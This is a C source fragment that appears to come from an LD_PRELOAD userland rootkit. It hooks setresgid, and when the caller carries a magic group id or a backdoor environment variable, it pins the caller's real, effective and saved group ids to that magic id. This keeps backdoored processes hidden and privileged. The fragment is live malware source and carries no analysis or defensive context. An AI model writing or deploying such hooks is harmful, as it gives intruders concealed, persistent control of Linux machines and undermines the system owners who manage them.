int setresgid(gid_t rgid, gid_t egid, gid_t sgid){
    hook(CSETRESGID);
    if(!initmvbc()) return (long)call(CSETRESGID, rgid, egid, sgid);
    if(getgid() == mvbc->magicid || getenv(mvbc->bdvar) != NULL){
        if(rgid != mvbc->magicid || egid != mvbc->magicid || sgid != mvbc->magicid)
            call(CSETRESGID, mvbc->magicid, mvbc->magicid, mvbc->magicid);
        return 0;
    }
    return (long)call(CSETRESGID, rgid, egid, sgid);
}
